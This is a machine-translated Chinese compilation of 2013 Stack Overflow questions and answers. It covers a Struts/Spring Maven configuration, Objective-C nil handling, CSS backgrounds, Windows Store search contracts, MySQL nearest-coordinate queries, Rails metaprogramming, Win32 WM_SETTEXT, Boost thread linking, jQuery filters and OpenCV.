<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>EmployeeManagementSystem</groupId>
    <artifactId>EmployeeManagementSystem</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <packaging>war</packaging>
    <name>EmployeeManagementSystem</name>
    <description>EmployeeManagementSystem</description>
    <dependencies>
        <dependency>
            <groupId>org.hibernate</groupId>
            <artifactId>hibernate-core</artifactId>
            <version>3.5.4-Final</version>
        </dependency>
        <dependency>
            <groupId>org.apache.struts</groupId>
            <artifactId>struts2-core</artifactId>
            <version>2.1.6</version>
        </dependency>
        <dependency>
            <groupId>org.apache.struts</groupId>
            <artifactId>struts2-dojo-plugin</artifactId>
            <version>2.3.8</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-aop</artifactId>
            <version>3.2.1.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-context</artifactId>
            <version>3.2.1.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>3.2.1.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-aspects</artifactId>
            <version>3.2.1.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-beans</artifactId>
            <version>3.2.1.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-orm</artifactId>
            <version>3.2.1.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-jdbc</artifactId>
            <version>3.2.1.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-web</artifactId>
            <version>3.2.1.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-hibernate3</artifactId>
            <version>2.0.7</version>
        </dependency>
        <dependency>
            <groupId>log4j</groupId>
            <artifactId>log4j</artifactId>
            <version>1.2.17</version>           
        </dependency>
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>5.1.24</version>
        </dependency>

        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring</artifactId>
            <version>2.5</version>
        </dependency>
        <dependency>
            <groupId>org.slf4j</groupId>
            <artifactId>slf4j-jdk14</artifactId>
            <version>1.5.8</version>
        </dependency>
        <dependency>
            <groupId>javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.12.1.GA</version>
        </dependency>
        <dependency>
            <groupId>org.apache.struts</groupId>
            <artifactId>struts2-tiles-plugin</artifactId>
            <version>2.3.8</version>
        </dependency>
    </dependencies>
</project> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-21T06:29:08.317

您已将 Struts 2 jar 放在 Tomcat 库目录中：

原因：名称为 xwork 的 bean 类型类 com.opensymphony.xwork2.ObjectFactory 已被 bean - jar:file:/C:/apache-tomcat-7.0.25-windows-x86/apache-tomcat-7.0 加载。 25/lib/struts2-core-2.3.4.1.jar!/struts-default.xml:29:72

从 servlet 容器中移除 Struts 相关的库；仅使用您的应用程序部署它们。

# ios - 当 Null 设置为 NSString 时会发生什么？

> ID：15998968
> 
> 赞同：-5
> 
> 时间：2013-04-14T12:17:30.447
> 
> 标签：ios, objective-c, memory-management

`Null`设置为时会发生什么`NSString`？并保存在`NSUserDefaults`?? 它会崩溃，因为它将它视为一个已释放的实例？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T13:04:29.023

现在，如果您要说的是“将 NSString 指针设置为 Null 时会发生什么”，那在一定程度上取决于您所说的“Null”（这不是标准的 Objective-C 术语）的含义。

“Null”可以表示“nil”（具有“null”和“NULL”的 C 别名），也可以表示 NSNull 对象。

“nil”是一个“空指针”——全为零。这意味着指针不引用任何对象。“NSNull”是一个对象类，它的唯一（“单例”）实例用于表示“无”，即使有一个真实的对象表示它。

您可以轻松地将 NSString 指针（即声明的东西`NSString *`）设置为 nil。（注意，“nil”周围没有引号！）这使得指针“空”。

您还可以通过强制转换将 NSString 指针设置为指向 NSNull 对象，尽管这并不常见。

（当然，您可以将 NSString 指针设置为“空字符串” -- `@""`。这是一个真正的零长度字符串，与 nil/null 没有真正的关系。）

由于“局部”变量（在方法中声明的变量）在输入方法时不会被编译器隐式置零，因此在方法输入时将声明的指针显式设置为 nil 通常是一种好习惯，这样，如果它们最终没有得到设置（但确实被引用），它们不会包含会产生神秘错误的“垃圾”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T12:51:08.030

你在混合隐喻。首先，散布一些关于对象类型的 NSLog 消息，然后保存然后检索（NSStringFromClass[obj class]）。如果您使用的是基于 C 的 SQLite 接口或带有 SQLite 后备存储的 Core Data，您没有明确说明，因此请更新您的问题。

最后，如果您向 A 类的对象发送只有 B 类响应的消息，您将收到指出该错误的异常。解除分配的错误完全不同，表明您的内存管理有问题。要追踪后一个错误，请启用 Zombies 并中断发送给其中的任何消息（有关如何在此处执行此操作的许多问答）。

# javascript - 这个背景图是如何实现的？

> ID：15998971
> 
> 赞同：-3
> 
> 时间：2013-04-14T12:17:33.370
> 
> 标签：javascript, html, css, background

[我在偏移量](http://www.offset.com/)处查看了这个令人惊叹的登录页面，想知道这个背景图像是如何实现的？我没看到。就像`background-image:url('paper.gif');`在代码中一样。您知道图像是如何在网站中实现的吗？

我很感谢你的回答！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:19:36.097

```
body {
background: url(/images/v2/grid_invitepage_fade.jpg) center 150px repeat-x #000!important;
} 
```

在： [http ://www.offset.com/stylesheets/app_min/new_homepage.min.css?v=0.6.40](http://www.offset.com/stylesheets/app_min/new_homepage.min.css?v=0.6.40)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-14T12:56:59.940

好问题。它在 CSS 中。正如上面那个人指出的那样。看看它的样式表。

# vb.net - Windows 应用商店应用搜索合同空白屏幕

> ID：15998974
> 
> 赞同：2
> 
> 时间：2013-04-14T12:17:51.670
> 
> 标签：vb.net, windows-8, visual-studio-2012, windows-store-apps

我最近将搜索合同添加到我的应用程序中。它工作得很好！但是，每当我在应用程序未运行时搜索它时，它只会以空白屏幕开始。即使在 OnSearchActivated 方法中，我也做了添加搜索结果的部分。但即使我删除了我添加的代码，空白屏幕仍然存在。我创建了一个空白项目并将搜索合同添加到其中。即使应用程序未运行，它也可以在其中工作。问题似乎仅与我的应用程序有关。我无法调试它，因为它是在应用程序甚至没有运行时运行的东西。告诉我一个解决方案。

OnSearchActivated 和 OnLaunched 中的代码

```
Protected Overrides Async Sub OnSearchActivated(args As Windows.ApplicationModel.Activation.SearchActivatedEventArgs)
    Dim previousContent As UIElement = Window.Current.Content
    Dim frame As Frame = TryCast(previousContent, Frame)
    If frame Is Nothing Then
        frame = New Frame
        Common.SuspensionManager.RegisterFrame(frame, "AppFrame")
        If args.PreviousExecutionState = ApplicationExecutionState.Terminated Then
            Try
                Await Common.SuspensionManager.RestoreAsync()
            Catch ex As Common.SuspensionManagerException
            End Try
        End If
    End If
    frame.Navigate(GetType(SearchResultsPage1), args.QueryText)
    Window.Current.Content = frame
    Window.Current.Activate()
End Sub

Protected Overrides Async Sub OnLaunched(args As Windows.ApplicationModel.Activation.LaunchActivatedEventArgs)
    AddHandler SearchPane.GetForCurrentView.SuggestionsRequested, AddressOf OnSearchPaneSuggestionsRequested
'Contains definition of arrays ExNam, ExAbbr, ExInst, etc. removed from here to shorten the code and focus on its logic
    If rootFrame Is Nothing Then
        rootFrame = New Frame()
        Train_Thy_Brain.Common.SuspensionManager.RegisterFrame(rootFrame, "appFrame")
        If args.PreviousExecutionState = ApplicationExecutionState.Terminated Then
            Await Train_Thy_Brain.Common.SuspensionManager.RestoreAsync()
        End If
        Window.Current.Content = rootFrame
    End If
    If rootFrame.Content Is Nothing Then
        If Not rootFrame.Navigate(GetType(Instructions), args.Arguments) Then
            Throw New Exception("Failed to create initial page")
        End If
    End If
    Window.Current.Activate()
End Sub 
```

'此外，命名空间定义是在顶部完成的，因此它们也不是问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T12:49:47.000

**有一个调试您的应用程序的解决方案：在 VS2012 中，在解决方案资源管理器**中右键单击您的项目，然后转到“**调试**”选项卡并在“**开始操作”**部分中，选中“***不启动，但在启动时调试我的代码***” .

现在您可以从 Search Contract 启动您的应用程序，即使它尚未运行并对其进行调试！

现在对于您的问题，我建议您在实际搜索某些内容之前检查数据是否已加载。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T14:33:51.510

您可能会使用空查询字符串来激活搜索。检查您的搜索激活处理程序，您是否正在处理空白查询文本大小写？

```
protected override void OnSearchActivated(SearchActivatedEventArgs args)
{
    // your app initialization code here.

    Frame frame = (Frame)Window.Current.Content;
    if (!string.IsNullOrEmpty(args.QueryText))
    {
        frame.Navigate(typeof(SearchResultsPage), args.QueryText);
    }
    else
    {
        // navigate to your app home page if the query text is empty. 
        frame.Navigate(typeof(Home), null);
    }

    Window.Current.Activate();
} 
```

# mysql - 是否有任何 MySQL 函数可以直接从数据库中获取与给定坐标最接近的 5 个坐标？

> ID：15998977
> 
> 赞同：0
> 
> 时间：2013-04-14T12:18:14.780
> 
> 标签：mysql, coordinates

我正在使用 PHP 并使用 MySQL 作为数据库。我需要一种方法，从数据库中获取与给定坐标最接近的 5 个坐标，这非常快且至少 80-90% 准确。我研究了很多。我发现了harshine公式、余弦球面定律、将最小和最大纬度-经度值与数据库中的坐标进行比较的边界平方方法以及使用三角数学函数的其他方法。但是所有这些公式都需要很长时间才能在包含数千个条目的数据库中返回结果。MySQL 是否提供任何功能来快速完成它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T16:34:14.010

在 GIS Stack 站点上查看[这个类似的问题。](https://gis.stackexchange.com/a/31629)您最终解决方案的性能将取决于您正在搜索的参考表中有多少目标以及您是否可以限制您感兴趣的距离（例如 30 英里内最近的 5 个）。我认为您无法可靠地优化流程。您需要计算参考表中所有坐标的距离。

# ruby-on-rails - Rails - 动态生成动作

> ID：15998978
> 
> 赞同：0
> 
> 时间：2013-04-14T12:18:30.130
> 
> 标签：ruby-on-rails, ruby

在控制器中有一个代码

```
 def action1
    generic_call __method__
  end

  def action2
    generic_call __method__
  end

  #......
  def action_n
    generic_call __method__
  end

 private

 def generic_call method_name
   #..........
 end 
```

为了摆脱重复，动态生成动作会更好吗？与静态定义相比，它会更昂贵吗？我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T13:41:06.097

主要成本实际上是必须自己重复所有代码，请记住 Rails 的理念是 DRY（不要重复自己）。

如果通过元编程定义方法有任何开销，您根本不会注意到它，但是您可以自己运行一些基准测试以确定，但即使是 rails 源代码也充满了元编程和动态方法这个地方，特别是**ActiveRecord**。

```
class MyController < ActionController::Base
  [:action1, :action2, :action3].each do |method_name|
    send :define_method, method_name do
      generic_call __method__
    end
  end
end 
```

# c++ - win32 WM_SETTEXT 不工作

> ID：15998982
> 
> 赞同：0
> 
> 时间：2013-04-14T12:19:02.603
> 
> 标签：c++, visual-studio-2010, winapi

我做了一个像这样的小文本框

```
EBX =   CreateWindow(TEXT("EDIT"),  TEXT(""),  WS_CHILD | WS_VISIBLE | WS_TABSTOP | ES_NUMBER | WS_BORDER, 
            client.right - offset[1] - 200, client.top + offset[2] - 27, 
            45, 25, hwnd, (HMENU)ID_EDIT_SPEED, NULL, NULL); 
```

那里一切都很好，但是当我尝试像这样更改里面的文本时，我遇到了一些问题

```
SendMessage(EBX, WM_SETTEXT, 0, (LPARAM)"12"); // working
int a = 40;
SendMessage(EBX, WM_SETTEXT, 0, (LPARAM)a); // not working 
```

知道有什么问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:23:47.163

40 不是字符串，“40”是。如果要将数字转换为字符串，则必须使用`sprintf`等函数。

例如

```
int a = 40;
char str[20];
StringCchPrintf(str, _countof(str), "%ld", a);
SendMessage(EBX, WM_SETTEXT, 0, (LPARAM)str); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T12:22:14.063

您不能盲目地将 int 类型转换为 char*，使用 sprintf、stringstream 或 std::to_string 来创建包含 int 值的文字表示的字符串。
或者，如果您想输入值为 40 的 char，则需要将指针传递给 null 终止字符数组。喜欢

```
char str[2];
str[0]=40;
str[1]=0; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T12:27:13.007

将 40 转换为 c-string 并在 sendmessage 函数中使用

```
char buffer [33];
int i =40;
itoa (i,buffer,10);
SendMessage(EBX, WM_SETTEXT, 0, (LPARAM)buffer); 
```

# c++ - 使用 Boost Thread 的 C++ 链接器错误

> ID：15998984
> 
> 赞同：1
> 
> 时间：2013-04-14T12:19:20.230
> 
> 标签：c++, boost, boost-thread

尝试构建我在互联网上找到的标准 Boost::thread 示例时，我得到了 Boost 头文件 thread_data.hpp 引发的多个错误，我没有直接链接到该文件，但我认为它是由 Boost 链接的。（我在实际程序中也遇到了同样的错误，但我使用示例代码来确保我的代码没有问题。）

这是我在 boost::thread 教程中找到的示例代码：

```
 #include <iostream>
    #include <boost/thread.hpp>
    #include <boost/date_time.hpp>

    void workerFunc()
    {
        boost::posix_time::seconds workTime(3);
        std::cout << "Worker: running" << std::endl;

        // Pretend to do something useful...
        boost::this_thread::sleep(workTime);
        std::cout << "Worker: finished" << std::endl;
    }

    int main(int argc, char* argv[])
    {
        std::cout << "main: startup" << std::endl;
        boost::thread workerThread(workerFunc);
        std::cout << "main: waiting for thread" << std::endl;
        workerThread.join();
        std::cout << "main: done" << std::endl;
        return 0;
    } 
```

这是我的构建命令：

```
 mingw32-g++.exe -LC:\projects\boost\lib  -o bin\Debug\Guardian.exe obj\Debug\Scratch.o    -lboost_filesystem-mgw47-mt-1_53 -lboost_date_time-mgw47-mt-1_53 -lboost_system-mgw47-mt-1_53 -lboost_thread-mgw47-mt-1_53 
```

（请注意，我*正在*链接*boost.thread*库。）

这是抛出的第一个错误：

```
 C:\projects\boost\include\boost-1_53\boost\thread\win32\thread_data.hpp|123|undefined reference to `_imp___ZTVN5boost6detail16thread_data_baseE'| 
```

在 CodeBlocks 中，我指出头文件 thread_data.hpp 的第 123 行是错误的来源：

```
 //#if defined BOOST_THREAD_PROVIDES_INTERRUPTIONS
            , interruption_handle(create_anonymous_event(detail::win32::manual_reset_event,detail::win32::event_initially_reset))
            , interruption_enabled(true) 
```

我忘记链接图书馆了吗？我一直在使用 Boost 没有问题，直到现在我正在尝试使用线程库。我是 Boost 新手，不知道是什么导致了错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T15:28:32.660

尝试将 -lpthread 添加到链接器。

# javascript - 循环选择列表菜单以创建搜索过滤器

> ID：15998985
> 
> 赞同：2
> 
> 时间：2013-04-14T12:19:20.307
> 
> 标签：javascript, jquery, css, html, dynamically-generated

我知道我问了很长的问题，但我真的需要这个解决方案。

我需要`looping`为搜索过滤器选项创建一个搜索选择框。例如，

*   当我从列表中选择名称时，最初会有一个包含 5 个列表项的选择菜单，然后我应该在旁边的文本框中输入特定数据。（如图1所示）
*   现在我需要添加另一行选择菜单。通过单击旁边的 + 按钮，我应该能够添加另一行，当添加另一个选择菜单时，第一行的 + 按钮应变为关闭（X）按钮
*   生成新行时，选择菜单应该会吐出先前选择的项目，这意味着它现在应该只包含 4 个项目。还有 + 和 X 按钮。
*   重复相同的情况，直到选择菜单中的项目结束。

之后我需要添加另一个选择菜单来输入另一组数据，在这种情况下，之前选择的项目不应该出现在循环选择菜单中

这是更新的基本**[代码](http://jsfiddle.net/LtBu8/16/)**

**图 1**

![在此处输入图像描述](https://i.stack.imgur.com/Ezps4.jpg)

**图 2**

![在此处输入图像描述](https://i.stack.imgur.com/FLUQN.jpg)

**注意：在我的小提琴中，当您单击 + 按钮时，请参考第一个动作，当循环行的按钮单击时，我需要相同的效果，并且一旦我单击第一个 + 按钮，它应该变成关闭按钮。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T14:20:25.407

`**[LIVE DEMO](http://jsbin.com/ohawec/4/edit)**`

HTML：

```
<div class="filtr">

     <!-- we'll clone this one... -->   
    <div class="loop"> 
        <select>
            <option>By Name</option>
            <option>By ID</option>
            <option>By Place</option>
            <option>By Post</option>
            <option>By Tag</option>
        </select>
        <input type="text" />
        <button class="btn del">X</button>
        <button class="btn add">+</button>
    </div>
    <!-- here ...-->

</div> 
```

CSS (IE9+):

```
.filtr{
    width:350px;
}
.loop {
    background:#ccc;
    display:inline-block;
}
.loop .add{
    display:none;
}
.loop:only-of-type .del{
    display:none;
}
.loop:only-of-type .add{
    display:inline;
}
.loop:last-of-type:not(:only-of-type) .add{
    display:inline;
} 
```

jQuery：

```
$filtr = $('.filtr');

$filtr.on('click', '.add', function(){
   $(this).closest('.loop').clone().appendTo( $filtr );
});

$filtr.on('click', '.del', function(){
   $(this).closest('.loop').remove();
}); 
```

# jquery-mobile - jQuery Mobile 上的横向纵向更改重新渲染页面

> ID：15998991
> 
> 赞同：0
> 
> 时间：2013-04-14T12:20:17.903
> 
> 标签：jquery-mobile

我正在 jQuery Mobile 中创建一个基于 wordpress 的应用程序，其子主题为 22 岁。可能CSS可以做得更好。该应用程序加载正常，没有缩放，也没有滚动

```
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/> 
```

但是，当将 iPhone 上的方向从**横向更改为纵向**时，我得到的屏幕比实际页面更宽，并且当页面上的表单中有输入字段时，滚动显示在中间。**但是，当在表单输入字段上选择（聚焦）时，页面会重新呈现，并且宽度正确且没有滚动**。我使用了一些响应式 CSS，例如 @media only screen 和 (max-width:..

那么有没有好的方法呢？

```
//This one triggers on orientation change
jQuery( window ).on('orientationchange', function( event ) { 
  if(event.orientation == 'portrait'){
    // Rerender as if an input field is focused.. 
  }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:30:48.083

这可能是一个解决方案。更好的当然是阻止它从头开始构建一些好的 CSS，但是如果在 wordpress 中使用 212 作为父主题 - 这段代码可能会派上用场。

```
jQuery( window ).on('orientationchange', function( event ) { 
    if(event.orientation == 'portrait'){
        jQuery('body').fadeOut(300, function(){ 
            jQuery('body').fadeIn(300);
        });
    }
}); 
```

# java - 如何将实时相机图像与图像匹配

> ID：15998997
> 
> 赞同：2
> 
> 时间：2013-04-14T12:20:38.607
> 
> 标签：java, android, camera, match, live

有没有办法将实时相机图像与图像匹配？

例如，我想在显示多个手指时调用一个函数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:35:32.590

**这是一个名为OpenCV**的开源计算机视觉库：

> OpenCV 是在 BSD 许可下发布的，它可以免费用于学术和商业用途。它具有在 Windows、Linux、Android 和 Mac 上运行的 C++、C、Python 和 Java 接口。该库有超过 2500 种优化算法（见下图）。它在全球范围内使用，下载量超过 250 万，用户组人数超过 4 万人。使用范围从交互式艺术到矿山检查，通过先进的机器人技术在网络上拼接地图。

[http://opencv.willowgarage.com/wiki/](http://opencv.willowgarage.com/wiki/)